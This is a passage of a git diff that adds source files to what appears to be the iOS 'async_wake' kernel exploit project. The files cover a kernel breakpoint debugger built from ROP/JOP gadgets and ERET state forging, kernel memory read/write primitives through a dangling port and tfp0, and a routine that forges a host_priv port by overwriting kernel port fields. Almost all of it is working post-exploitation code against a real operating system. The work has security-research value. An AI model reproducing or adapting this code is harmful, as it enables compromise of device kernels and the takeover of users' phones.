+  uint64_t thread_kernel_stack_top = rk64(thread_t_addr + koffset(KSTRUCT_OFFSET_THREAD_KSTACKPTR));
+  eret_return_state.ss.ss_64.sp = thread_kernel_stack_top;
+  
+  // the target place to eret to (see code snippet above)
+  eret_return_state.ss.ss_64.pc = ksym(KSYMBOL_VALID_LINK_REGISTER);
+  
+  // the whole point of this, cpsr! this will be restored to SPSR_EL1 before the eret
+  // see D1.6.4 of the armv8 manual
+  // we want to return on to SP0 and to EL1
+  // A,I,F should still be masked, D unmasked
+#define SPSR_A   (1<<8)
+#define SPSR_I   (1<<7)
+#define SPSR_F   (1<<6)
+#define SPSR_EL1_SP0 (0x4)
+  eret_return_state.ss.ss_64.cpsr = SPSR_A | SPSR_I | SPSR_F | SPSR_EL1_SP0;
+  
+  //uint64_t eret_return_state_kern = kmem_alloc_wired(sizeof(arm_context_t));
+  uint64_t eret_return_state_kern = early_kalloc(sizeof(arm_context_t));
+  kmemcpy(eret_return_state_kern, (uint64_t)&eret_return_state, sizeof(arm_context_t));
+  
+  // make the arbitrary call
+  kcall(ksym(KSYMBOL_X21_JOP_GADGET), 2, eret_return_state_kern, ksym(KSYMBOL_EXCEPTION_RETURN));
+}
+
+
+/*
+ we want to call this gadget:
+ FFFFFFF0071E1998 MSR #0, c0, c2, #2, X8 ; [>] MDSCR_EL1 (Monitor Debug System Control Register)
+ FFFFFFF0071E199C ISB // this a workaround for some errata...
+ FFFFFFF0071E19A0 B    loc_FFFFFFF0071E19F8
+ ...
+ FFFFFFF0071E19F8 BL   _ml_set_interrupts_enabled
+ FFFFFFF0071E19FC ADD  SP, SP, #0x220
+ FFFFFFF0071E1A00 LDP  X29, X30, [SP,#0x20+var_s0]
+ FFFFFFF0071E1A04 LDP  X20, X19, [SP,#0x20+var_10]
+ FFFFFFF0071E1A08 LDP  X28, X27, [SP+0x20+var_20],#0x30
+ FFFFFFF0071E1A0C RET
+
+ lets just use the ERET case to get full register control an run that on a little ROP stack which then
+ returns to thread_exception_return
+ 
+ */
+void set_MDSCR_EL1_KDE(mach_port_t target_thread_port) {
+  /* this state will be restored by an eret */
+  arm_context_t eret_return_state = {0};
+  
+  // allocate a stack for the rop:
+  //uint64_t rop_stack_kern_base = kmem_alloc_wired(0x4000);
+  uint64_t rop_stack_kern_base = early_kalloc(0x1000);
+  
+  uint64_t rop_stack_kern_middle = rop_stack_kern_base + 0xc00;
+  
+  eret_return_state.ss.ss_64.sp = rop_stack_kern_middle;
+  uint64_t rop_stack_kern_popped_base = rop_stack_kern_middle + 0x220;
+  // x28, x27, x20, x19, fp, lr
+  uint64_t popped_regs[] = {0, 0, 0, 0, 0x414243444546, ksym(KSYMBOL_THREAD_EXCEPTION_RETURN)}; // directly return back to userspace after this
+  kmemcpy(rop_stack_kern_popped_base, (uint64_t)popped_regs, sizeof(popped_regs));
+
+#define MDSCR_EL1_KDE (1<<13)
+  eret_return_state.ss.ss_64.x[8] = MDSCR_EL1_KDE;
+  
+  // the target place to eret to
+  eret_return_state.ss.ss_64.pc = ksym(KSYMBOL_SET_MDSCR_EL1_GADGET);
+  
+  // we want to return on to SP0 and to EL1
+  // A,I,F should still be masked, D unmasked (here we could actually mask D?)
+#define SPSR_A   (1<<8)
+#define SPSR_I   (1<<7)
+#define SPSR_F   (1<<6)
+#define SPSR_EL1_SP0 (0x4)
+  eret_return_state.ss.ss_64.cpsr = SPSR_A | SPSR_I | SPSR_F | SPSR_EL1_SP0;
+  
+  //uint64_t eret_return_state_kern = kmem_alloc_wired(sizeof(arm_context_t));
+  uint64_t eret_return_state_kern = early_kalloc(sizeof(arm_context_t));
+  kmemcpy(eret_return_state_kern, (uint64_t)&eret_return_state, sizeof(arm_context_t));
+  
+  // make the arbitrary call
+  kcall(ksym(KSYMBOL_X21_JOP_GADGET), 2, eret_return_state_kern, ksym(KSYMBOL_EXCEPTION_RETURN));
+  
+  printf("returned from trying to set the KDE bit\n");
+  
+  // free the stack we used:
+  //kmem_free(rop_stack_kern_base, 0x4000);
+}
+
+
+
+/*
+ target_thread_port is the thread port for a thread which may or already has hit a kernel hw breakpoint.
+ detect whether that is the case, and if so find the register state when the BP was hit.
+ 
+ where to find stuff:
+ 
+ userspace svc: EL0+SP0 -> EL1+SP1 (sync exception from lower exception level running aarch64)
+ userspace state gets saved in thread->ACT_CONTEXT
+ stack switched to thread's kernel stack pointer and SP0 selected
+ does stuff which then hits kernel hw bp
+ 
+ kernel hw bp: EL1+SP0 -> EL1+SP1 (sync exception from same exception level running on SP0)
+ switch back to SP0 and push new arm_context_t on the there. point x21 to this saved state area.
+ control flow reaches infinite loop
+ 
+ fiq timer: EL1+SP0 -> EL1+SP1 (fiq interrupt from same exception level running on SP0)
+ switch back to SP0 and push new arm_context_t on there. point x21 to there.
+ then set sp to the interrupt stack.
+ 
+ schedule off:
+ this will happen just before the fiq timer interrupt returns in return_to_kernel
+ it will set sp back to x21 (as if to eret back to the previous exception level) then call ast_taken_kernel
+ 
+ if the thread will be scheduled off just a small amount of state will be saved to the reserved area
+ above the top of the thread's kernel stack, sufficient to get the thread back on the core and
+ resume execution.
+ 
+ 
+   +-----------------------------+
+   |                             |
+   | struct thread_kernel_state  | <-- *above* the top of thread kernel stack
+   |                             |
++> +=============================+ <-- top of thread kernel stack
+|  |                             |
+|  | syscall stack frames of     |
+|  | varying depth               |
+|  | (not user state)            |
+|  |                             |
+|  +-----------------------------+ <-- kernel hw bp: EL1+SP0 -> EL1+SP1 (sync exception from same exception level running on SP0)
+|  |                             | <-- saved state from when the bp was hit
+|  | struct arm_context_t        |
+|  | .pc = address of hit bp     |
+|  +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
+|  |                             |
+|  |                             |
+|  | stack frames from sync excp |
+|  | to the infinite loop...     |
+|  |                             |
+|  +-----------------------------+ <-- fiq timer: EL1+SP0 -> EL1+SP1 (fiq interrupt from same exception level running on SP0)
+|  | struct arm_context_t        | <-- saved state from the infinite loop before it was scheduled off
+|  | .pc = addr of the infinite  |
+|  |       loop instr            |
+|  |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
+|  |                             |
+|  |                             |
+|  |                             |
+|  |                             |
++- +-----------------------------+
+ */
+
+typedef void (*breakpoint_callback)(arm_context_t* context);
+
+volatile int syscall_complete = 0;
+
+void handle_kernel_bp_hits(mach_port_t target_thread_port, uint64_t looper_pc, uint64_t breakpoint, breakpoint_callback callback) {
+  // get the target thread's thread_t
+  uint64_t thread_port_addr = find_port_address(target_thread_port, MACH_MSG_TYPE_COPY_SEND);
+  uint64_t thread_t_addr = rk64(thread_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  
+  while (1) {
+    uint64_t looper_saved_state = 0;
+    int found_it = 0;
+    while (!found_it) {
+      if (syscall_complete) {
+        return;
+      }
+      // we've pinned ourself to the same core, so if we're running, it isn't...
+      // in some ways this code is very racy, but when we actually have detected that the target
+      // thread has hit the breakpoint it should be safe until we restart it
+      // and up until then we don't do anything too dangerous...
+      
+      
+      // get the kstack pointer
+      uint64_t kstackptr = rk64(thread_t_addr + koffset(KSTRUCT_OFFSET_THREAD_KSTACKPTR));
+      
+      printf("kstackptr: %llx\n", kstackptr);
+      
+      // get the thread_kernel_state
+      // the stack lives below kstackptr, and kstackptr itself points to a struct thread_kernel_state:
+      // the first bit of that is just an arm_context_t:
+      // this is the scheduled-off state
+      arm_context_t saved_ksched_state = {0};
+      kmemcpy((uint64_t)&saved_ksched_state, kstackptr, sizeof(arm_context_t));
+      
+      // get the saved stack pointer
+      uint64_t sp = saved_ksched_state.ss.ss_64.sp;
+      printf("sp: %llx\n", sp);
+      
+      if (sp == 0) {
+        continue;
+      }
+      
+      uint64_t stack[128] = {0};
+      
+      // walk up from there and look for the saved state dumped by the fiq:
+      // note that it won't be right at the bottom of the stack
+      // instead there are the frames for:
+      //   ast_taken_kernel       <-- above this is the saved state which will get restored when the hw bp spinner gets rescheduled
+      //     thread_block_reason
+      //       thread_invoke
+      //         machine_switch_context
+      //           Switch_context <-- the frame actually at the bottom of the stack
+      
+      // should probably walk those stack frame properly, but this will do...
+      
+      // grab the stack
+      kmemcpy((uint64_t)&stack[0], sp, sizeof(stack));
+      //for (int i = 0; i < 128; i++) {
+      //  printf("%016llx\n", stack[i]);
+      //}
+      
+      for (int i = 0; i < 128; i++) {
+        uint64_t flavor_and_count = stack[i];
+        if (flavor_and_count != (ARM_SAVED_STATE64 | (((uint64_t)ARM_SAVED_STATE64_COUNT) << 32))) {
+          continue;
+        }
+        
+        arm_context_t* saved_state = (arm_context_t*)&stack[i];
+        
+        if (saved_state->ss.ss_64.pc != looper_pc) {
+          continue;
+        }
+        
+        found_it = 1;
+        looper_saved_state = sp + (i*sizeof(uint64_t));
+        printf("found the saved state probably at %llx\n", looper_saved_state); // should walk the stack properly..
+        break;
+      }
+      
+      if (!found_it) {
+        printf("unable to find the saved scheduler tick state on the stack, waiting a bit then trying again...\n");
+        sleep(1);
+        return;
+      }
+      
+    }
+    
+    
+    
+    // now keep walking up and find the saved state for the code which hit the BP:
+    uint64_t bp_hitting_state = looper_saved_state + sizeof(arm_context_t);
+    found_it = 0;
+    for (int i = 0; i < 1000; i++) {
+      uint64_t flavor_and_count = rk64(bp_hitting_state);
+      if (flavor_and_count != (ARM_SAVED_STATE64 | (((uint64_t)ARM_SAVED_STATE64_COUNT) << 32))) {
+        bp_hitting_state += 8;
+        continue;
+      }
+      
+      arm_context_t bp_context;
+      kmemcpy((uint64_t)&bp_context, bp_hitting_state, sizeof(arm_context_t));
+      
+      for (int i = 0; i < 40; i++) {
+        uint64_t* buf = (uint64_t*)&bp_context;
+        printf("%016llx\n", buf[i]);
+      }
+      
+      if (bp_context.ss.ss_64.pc != breakpoint) {
+        printf("hummm, found an unexpected breakpoint: %llx\n", bp_context.ss.ss_64.pc);
+      }
+      
+      found_it = 1;
+      break;
+    }
+    
+    if (!found_it) {
+      printf("unable to find bp hitting state\n");
+    }
+    
+    // fix up the bp hitting state so it will continue (with whatever modifications we want:)
+    // get a copy of the state:
+    arm_context_t bp_context;
+    kmemcpy((uint64_t)&bp_context, bp_hitting_state, sizeof(arm_context_t));
+    
+    callback(&bp_context);
+    
+    // write that new state back:
+    kmemcpy(bp_hitting_state, (uint64_t)&bp_context, sizeof(arm_context_t));
+    
+    // unblock the looper:
+    wk64(looper_saved_state + offsetof(arm_context_t, ss.ss_64.pc), ksym(KSYMBOL_SLEH_SYNC_EPILOG));
+    
+    // when it runs again it should break out of the loop and continue the syscall
+    // forces us off the core and hopefully it on:
+    thread_switch(target_thread_port, 0, 0);
+    swtch_pri(0);
+    
+  }
+}
+
+struct monitor_args {
+  mach_port_t target_thread_port;
+  uint64_t breakpoint;
+  breakpoint_callback callback;
+};
+
+
+void* monitor_thread(void* arg) {
+  struct monitor_args* args = (struct monitor_args*)arg;
+  
+  printf("monitor thread running, pinning to core\n");
+  pin_current_thread();
+  printf("monitor thread pinned\n");
+  handle_kernel_bp_hits(args->target_thread_port, ksym(KSYMBOL_EL1_HW_BP_INFINITE_LOOP), args->breakpoint, args->callback);
+  return NULL;
+}
+
+// this runs on the thread which will execute the target syscall to debug
+void run_syscall_with_breakpoint(uint64_t bp_address, breakpoint_callback callback, uint32_t syscall_number, uint32_t n_args, ...) {
+  // pin this thread to the target cpu:
+  pin_current_thread();
+  
+  // set the Kernel Debug Enable bit of MDSCR_EL1:
+  set_MDSCR_EL1_KDE(mach_thread_self());
+  
+  // MDE will be set by the regular API for us
+  
+  // enable a hw debug breakpoint at bp_address
+  // it won't fire because PSTATE.D will be set, but we'll deal with that in a bit!
+  
+  // set a hardware bp on the thread using the proper API so that all the structures are already set up:
+  struct arm64_debug_state state = {0};
+  state.bvr[0] = bp_address;
+#define BCR_BAS_ALL (0xf << 5)
+#define BCR_E (1 << 0)
+  state.bcr[0] = BCR_BAS_ALL | BCR_E; // enabled
+  kern_return_t err = thread_set_state(mach_thread_self(),
+                                       ARM_DEBUG_STATE64,
+                                       (thread_state_t)&state,
+                                       sizeof(state)/4);
+  
+  // verify that it got set:
+  memset(&state, 0, sizeof(state));
+  mach_msg_type_number_t count = sizeof(state)/4;
+  err = thread_get_state(mach_thread_self(),
+                         ARM_DEBUG_STATE64,
+                         (thread_state_t)&state,
+                         &count);
+  
+  if (state.bvr[0] != bp_address) {
+    printf("setting the bp address failed\n");
+  }
+  
+  
+  // now go and find that thread's DebugData where those values are stored.
+  
+  uint64_t thread_port_addr = find_port_address(mach_thread_self(), MACH_MSG_TYPE_COPY_SEND);
+  uint64_t thread_t_addr = rk64(thread_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  
+  printf("thread_t_addr: %llx\n", thread_t_addr);
+  
+  // read bvr[0] in that thread_t's DebugData:
+  uint64_t DebugData = rk64(thread_t_addr + ACT_DEBUGDATA_OFFSET);
+  //printf("DebugData: %llx\n", DebugData);
+  
+  uint64_t bvr0 = rk64(DebugData + offsetof(struct arm_debug_aggregate_state, ds64.bvr[0]));
+  printf("bvr0 read from the DebugData: 0x%llx\n", bvr0);
+  
+  uint32_t bcr0 = rk32(DebugData + offsetof(struct arm_debug_aggregate_state, ds64.bcr[0]));
+  printf("bcr0 read from the DebugData: 0x%08x\n", bcr0);
+  
+  // need to manually set this too in the bcr:
+#define ARM_DBG_CR_MODE_CONTROL_ANY (3 << 1)
+  bcr0 |= ARM_DBG_CR_MODE_CONTROL_ANY;
+
+  wk32(DebugData + offsetof(struct arm_debug_aggregate_state, ds64.bcr[0]), bcr0);
+  
+  printf("set ARM_DBG_CR_MODE_CONTROL_ANY\n");
+  // returning from the syscall should be enough to set it.
+  
+  struct monitor_args* margs = malloc(sizeof(struct monitor_args));
+  margs->target_thread_port = mach_thread_self();
+  margs->breakpoint = bp_address;
+  margs->callback = callback;
+ 
+  // spin up a thread to monitor when the bp is hit:
+  pthread_t th;
+  pthread_create(&th, NULL, monitor_thread, (void*)margs);
+  printf("started monitor thread\n");
+  
+  struct syscall_args sargs = {0};
+  sargs.number = syscall_number;
+  va_list ap;
+  va_start(ap, n_args);
+  
+  for (int i = 0; i < n_args; i++){
+    sargs.arg[i] = va_arg(ap, uint64_t);
+  }
+  
+  va_end(ap);
+  
+  // now execute a syscall with PSTATE.D disabled:
+  syscall_complete = 0;
+  do_syscall_with_pstate_d_unmasked(&sargs);
+  syscall_complete = 1;
+  printf("syscall returned\n");
+  
+  pthread_join(th, NULL);
+  printf("monitor exited\n");
+
+}
+
+void sys_write_breakpoint_handler(arm_context_t* state) {
+  // we will have to skip it one instruction ahead because single step won't work...
+  state->ss.ss_64.pc += 4;
+  
+  // this means emulating what that instruction did:
+  // LDR             X8, [X8,#0x388]
+  uint64_t val = rk64(state->ss.ss_64.x[8] + 0x388);
+  state->ss.ss_64.x[8] = val;
+  
+  uint64_t uap = state->ss.ss_64.x[1];
+  char* replacer_string = strdup("a different string!\n");
+  wk64(uap+8, (uint64_t)replacer_string);
+  wk64(uap+0x10, strlen(replacer_string));
+}
+
+char* hello_wrld_str = "hellowrld!\n";
+void test_kdbg() {
+  run_syscall_with_breakpoint(ksym(KSYMBOL_WRITE_SYSCALL_ENTRYPOINT),  // breakpoint address
+                              sys_write_breakpoint_handler,            // breakpoint hit handler
+                              4,                                       // SYS_write
+                              3,                                       // 3 arguments
+                              1,                                       // stdout
+                              (uint64_t)hello_wrld_str,                // "hellowrld!\n"
+                              strlen(hello_wrld_str));                 // 11
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
diff --git a/async_wake_ios/kdbg.h b/async_wake_ios/kdbg.h
new file mode 100644
index 0000000..564dc5c
--- /dev/null
+++ b/async_wake_ios/kdbg.h
@@ -0,0 +1,9 @@
+#ifndef kdbg_h
+#define kdbg_h
+
+void test_kernel_bp(void);
+uint64_t pin_current_thread(void);
+void test_kdbg(void);
+void test_fp(void);
+
+#endif
diff --git a/async_wake_ios/kmem.c b/async_wake_ios/kmem.c
new file mode 100644
index 0000000..c4c6090
--- /dev/null
+++ b/async_wake_ios/kmem.c
@@ -0,0 +1,307 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#include <mach/mach.h>
+
+#include "kmem.h"
+#include "kutils.h"
+
+/***** mach_vm.h *****/
+kern_return_t mach_vm_read(
+  vm_map_t target_task,
+  mach_vm_address_t address,
+  mach_vm_size_t size,
+  vm_offset_t *data,
+  mach_msg_type_number_t *dataCnt);
+
+kern_return_t mach_vm_write(
+  vm_map_t target_task,
+  mach_vm_address_t address,
+  vm_offset_t data,
+  mach_msg_type_number_t dataCnt);
+
+kern_return_t mach_vm_read_overwrite(
+  vm_map_t target_task,
+  mach_vm_address_t address,
+  mach_vm_size_t size,
+  mach_vm_address_t data,
+  mach_vm_size_t *outsize);
+
+kern_return_t mach_vm_allocate(
+  vm_map_t target,
+  mach_vm_address_t *address,
+  mach_vm_size_t size,
+  int flags);
+
+kern_return_t mach_vm_deallocate (
+  vm_map_t target,
+  mach_vm_address_t address,
+  mach_vm_size_t size);
+
+kern_return_t mach_vm_protect (
+  vm_map_t target_task,
+  mach_vm_address_t address,
+  mach_vm_size_t size,
+  boolean_t set_maximum,
+  vm_prot_t new_protection);
+
+// the exploit bootstraps the full kernel memory read/write with a fake
+// task which just allows reading via the bsd_info->pid trick
+// this first port is kmem_read_port
+mach_port_t kmem_read_port = MACH_PORT_NULL;
+void prepare_rk_via_kmem_read_port(mach_port_t port) {
+  kmem_read_port = port;
+}
+
+mach_port_t tfp0 = MACH_PORT_NULL;
+void prepare_rwk_via_tfp0(mach_port_t port) {
+  tfp0 = port;
+}
+
+int have_kmem_read() {
+  return (kmem_read_port != MACH_PORT_NULL) || (tfp0 != MACH_PORT_NULL);
+}
+
+int have_kmem_write() {
+  return (tfp0 != MACH_PORT_NULL);
+}
+
+uint32_t rk32_via_kmem_read_port(uint64_t kaddr) {
+  kern_return_t err;
+  if (kmem_read_port == MACH_PORT_NULL) {
+    printf("kmem_read_port not set, have you called prepare_rk?\n");
+    sleep(10);
+    exit(EXIT_FAILURE);
+  }
+  
+  mach_port_context_t context = (mach_port_context_t)kaddr - 0x10;
+  err = mach_port_set_context(mach_task_self(), kmem_read_port, context);
+  if (err != KERN_SUCCESS) {
+    printf("error setting context off of dangling port: %x %s\n", err, mach_error_string(err));
+    sleep(10);
+    exit(EXIT_FAILURE);
+  }
+  
+  // now do the read:
+  uint32_t val = 0;
+  err = pid_for_task(kmem_read_port, (int*)&val);
+  if (err != KERN_SUCCESS) {
+    printf("error calling pid_for_task %x %s", err, mach_error_string(err));
+    sleep(10);
+    exit(EXIT_FAILURE);
+  }
+  
+  return val;
+}
+
+uint32_t rk32_via_tfp0(uint64_t kaddr) {
+  kern_return_t err;
+  uint32_t val = 0;
+  mach_vm_size_t outsize = 0;
+  err = mach_vm_read_overwrite(tfp0,
+                               (mach_vm_address_t)kaddr,
+                               (mach_vm_size_t)sizeof(uint32_t),
+                               (mach_vm_address_t)&val,
+                               &outsize);
+  if (err != KERN_SUCCESS){
+    printf("tfp0 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp0);
+    sleep(3);
+    return 0;
+  }
+  
+  if (outsize != sizeof(uint32_t)){
+    printf("tfp0 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
+    sleep(3);
+    return 0;
+  }
+  return val;
+}
+
+uint32_t rk32(uint64_t kaddr) {
+  if (tfp0 != MACH_PORT_NULL) {
+    return rk32_via_tfp0(kaddr);
+  }
+  
+  if (kmem_read_port != MACH_PORT_NULL) {
+    return rk32_via_kmem_read_port(kaddr);
+  }
+  
+  printf("attempt to read kernel memory but no kernel memory read primitives available\n");
+  sleep(3);
+  
+  return 0;
+}
+
+uint64_t rk64(uint64_t kaddr) {
+  uint64_t lower = rk32(kaddr);
+  uint64_t higher = rk32(kaddr+4);
+  uint64_t full = ((higher<<32) | lower);
+  return full;
+}
+
+void wkbuffer(uint64_t kaddr, void* buffer, uint32_t length) {
+  if (tfp0 == MACH_PORT_NULL) {
+    printf("attempt to write to kernel memory before any kernel memory write primitives available\n");
+    sleep(3);
+    return;
+  }
+  
+  kern_return_t err;
+  err = mach_vm_write(tfp0,
+                      (mach_vm_address_t)kaddr,
+                      (vm_offset_t)buffer,
+                      (mach_msg_type_number_t)length);
+  
+  if (err != KERN_SUCCESS) {
+    printf("tfp0 write failed: %s %x\n", mach_error_string(err), err);
+    return;
+  }
+}
+
+void rkbuffer(uint64_t kaddr, void* buffer, uint32_t length) {
+  kern_return_t err;
+  uint32_t val = 0;
+  mach_vm_size_t outsize = 0;
+  err = mach_vm_read_overwrite(tfp0,
+                               (mach_vm_address_t)kaddr,
+                               (mach_vm_size_t)length,
+                               (mach_vm_address_t)buffer,
+                               &outsize);
+  if (err != KERN_SUCCESS){
+    printf("tfp0 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp0);
+    sleep(3);
+    return;
+  }
+  
+  if (outsize != length){
+    printf("tfp0 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
+    sleep(3);
+    return;
+  }
+}
+
+const uint64_t kernel_address_space_base = 0xffff000000000000;
+void kmemcpy(uint64_t dest, uint64_t src, uint32_t length) {
+  if (dest >= kernel_address_space_base) {
+    // copy to kernel:
+    wkbuffer(dest, (void*) src, length);
+  } else {
+    // copy from kernel
+    rkbuffer(src, (void*)dest, length);
+  }
+}
+
+void wk32(uint64_t kaddr, uint32_t val) {
+  if (tfp0 == MACH_PORT_NULL) {
+    printf("attempt to write to kernel memory before any kernel memory write primitives available\n");
+    sleep(3);
+    return;
+  }
+  
+  kern_return_t err;
+  err = mach_vm_write(tfp0,
+                      (mach_vm_address_t)kaddr,
+                      (vm_offset_t)&val,
+                      (mach_msg_type_number_t)sizeof(uint32_t));
+  
+  if (err != KERN_SUCCESS) {
+    printf("tfp0 write failed: %s %x\n", mach_error_string(err), err);
+    return;
+  }
+}
+
+void wk64(uint64_t kaddr, uint64_t val) {
+  uint32_t lower = (uint32_t)(val & 0xffffffff);
+  uint32_t higher = (uint32_t)(val >> 32);
+  wk32(kaddr, lower);
+  wk32(kaddr+4, higher);
+}
+
+uint64_t kmem_alloc(uint64_t size) {
+  if (tfp0 == MACH_PORT_NULL) {
+    printf("attempt to allocate kernel memory before any kernel memory write primitives available\n");
+    sleep(3);
+    return 0;
+  }
+  
+  kern_return_t err;
+  mach_vm_address_t addr = 0;
+  mach_vm_size_t ksize = round_page_kernel(size);
+  err = mach_vm_allocate(tfp0, &addr, ksize, VM_FLAGS_ANYWHERE);
+  if (err != KERN_SUCCESS) {
+    printf("unable to allocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
+    sleep(3);
+    return 0;
+  }
+  return addr;
+}
+
+uint64_t kmem_alloc_wired(uint64_t size) {
+  if (tfp0 == MACH_PORT_NULL) {
+    printf("attempt to allocate kernel memory before any kernel memory write primitives available\n");
+    sleep(3);
+    return 0;
+  }
+  
+  kern_return_t err;
+  mach_vm_address_t addr = 0;
+  mach_vm_size_t ksize = round_page_kernel(size);
+  
+  printf("vm_kernel_page_size: %lx\n", vm_kernel_page_size);
+
+  err = mach_vm_allocate(tfp0, &addr, ksize+0x4000, VM_FLAGS_ANYWHERE);
+  if (err != KERN_SUCCESS) {
+    printf("unable to allocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
+    sleep(3);
+    return 0;
+  }
+  
+  printf("allocated address: %llx\n", addr);
+  
+  addr += 0x3fff;
+  addr &= ~0x3fffull;
+  
+  printf("address to wire: %llx\n", addr);
+  
+  err = mach_vm_wire(fake_host_priv(), tfp0, addr, ksize, VM_PROT_READ|VM_PROT_WRITE);
+  if (err != KERN_SUCCESS) {
+    printf("unable to wire kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
+    sleep(3);
+    return 0;
+  }
+  return addr;
+}
+
+void kmem_free(uint64_t kaddr, uint64_t size) {
+  return;
+  if (tfp0 == MACH_PORT_NULL) {
+    printf("attempt to deallocate kernel memory before any kernel memory write primitives available\n");
+    sleep(3);
+    return;
+  }
+  
+  kern_return_t err;
+  mach_vm_size_t ksize = round_page_kernel(size);
+  err = mach_vm_deallocate(tfp0, kaddr, ksize);
+  if (err != KERN_SUCCESS) {
+    printf("unable to deallocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
+    sleep(3);
+    return;
+  }
+}
+
+void kmem_protect(uint64_t kaddr, uint32_t size, int prot) {
+  if (tfp0 == MACH_PORT_NULL) {
+    printf("attempt to change protection of kernel memory before any kernel memory write primitives available\n");
+    sleep(3);
+    return;
+  }
+  kern_return_t err;
+  err = mach_vm_protect(tfp0, (mach_vm_address_t)kaddr, (mach_vm_size_t)size, 0, (vm_prot_t)prot);
+  if (err != KERN_SUCCESS) {
+    printf("unable to change protection of kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
+    sleep(3);
+    return;
+  }
+}
diff --git a/async_wake_ios/kmem.h b/async_wake_ios/kmem.h
new file mode 100644
index 0000000..69043fc
--- /dev/null
+++ b/async_wake_ios/kmem.h
@@ -0,0 +1,30 @@
+#ifndef kmem_h
+#define kmem_h
+
+#include <mach/mach.h>
+
+uint32_t rk32(uint64_t kaddr);
+uint64_t rk64(uint64_t kaddr);
+
+void wk32(uint64_t kaddr, uint32_t val);
+void wk64(uint64_t kaddr, uint64_t val);
+
+void wkbuffer(uint64_t kaddr, void* buffer, uint32_t length);
+void rkbuffer(uint64_t kaddr, void* buffer, uint32_t length);
+
+void kmemcpy(uint64_t dest, uint64_t src, uint32_t length);
+
+void kmem_protect(uint64_t kaddr, uint32_t size, int prot);
+
+uint64_t kmem_alloc(uint64_t size);
+uint64_t kmem_alloc_wired(uint64_t size);
+void kmem_free(uint64_t kaddr, uint64_t size);
+
+void prepare_rk_via_kmem_read_port(mach_port_t port);
+void prepare_rwk_via_tfp0(mach_port_t port);
+
+// query whether kmem read or write is present
+int have_kmem_read(void);
+int have_kmem_write(void);
+
+#endif
diff --git a/async_wake_ios/kutils.c b/async_wake_ios/kutils.c
new file mode 100644
index 0000000..7fd4712
--- /dev/null
+++ b/async_wake_ios/kutils.c
@@ -0,0 +1,83 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <mach/mach.h>
+
+#include "kutils.h"
+#include "kmem.h"
+#include "find_port.h"
+#include "symbols.h"
+
+uint64_t cached_task_self_addr = 0;
+uint64_t task_self_addr() {
+  if (cached_task_self_addr == 0) {
+    cached_task_self_addr = find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
+    printf("task self: 0x%llx\n", cached_task_self_addr);
+  }
+  return cached_task_self_addr;
+}
+
+uint64_t ipc_space_kernel() {
+  return rk64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
+}
+
+uint64_t current_thread() {
+  uint64_t thread_port = find_port_address(mach_thread_self(), MACH_MSG_TYPE_COPY_SEND);
+  return rk64(thread_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+}
+
+uint64_t find_kernel_base() {
+  uint64_t hostport_addr = find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
+  uint64_t realhost = rk64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  
+  uint64_t base = realhost & ~0xfffULL;
+  // walk down to find the magic:
+  for (int i = 0; i < 0x10000; i++) {
+    if (rk32(base) == 0xfeedfacf) {
+      return base;
+    }
+    base -= 0x1000;
+  }
+  return 0;
+}
+mach_port_t fake_host_priv_port = MACH_PORT_NULL;
+
+// build a fake host priv port
+mach_port_t fake_host_priv() {
+  if (fake_host_priv_port != MACH_PORT_NULL) {
+    return fake_host_priv_port;
+  }
+  // get the address of realhost:
+  uint64_t hostport_addr = find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
+  uint64_t realhost = rk64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+  
+  // allocate a port
+  mach_port_t port = MACH_PORT_NULL;
+  kern_return_t err;
+  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+  if (err != KERN_SUCCESS) {
+    printf("failed to allocate port\n");
+    return MACH_PORT_NULL;
+  }
+  
+  // get a send right
+  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+  
+  // locate the port
+  uint64_t port_addr = find_port_address(port, MACH_MSG_TYPE_COPY_SEND);
+  
+  // change the type of the port
+#define IKOT_HOST_PRIV 4
+#define IO_ACTIVE   0x80000000
+  wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_HOST_PRIV);
+  
+  // change the space of the port
+  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
+  
+  // set the kobject
+  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), realhost);
+  
+  fake_host_priv_port = port;
+  
+  return port;
+}
diff --git a/async_wake_ios/kutils.h b/async_wake_ios/kutils.h
new file mode 100644
index 0000000..2b2b8c1
--- /dev/null
+++ b/async_wake_ios/kutils.h
@@ -0,0 +1,14 @@
+#ifndef kutils_h
+#define kutils_h
+
+#include <mach/mach.h>
+
+uint64_t task_self_addr(void);
+uint64_t ipc_space_kernel(void);
+uint64_t find_kernel_base(void);
+
+uint64_t current_thread(void);
+
+mach_port_t fake_host_priv(void);
+
+#endif /* kutils_h */
diff --git a/async_wake_ios/main.m b/async_wake_ios/main.m
new file mode 100644
index 0000000..0edc47d
--- /dev/null
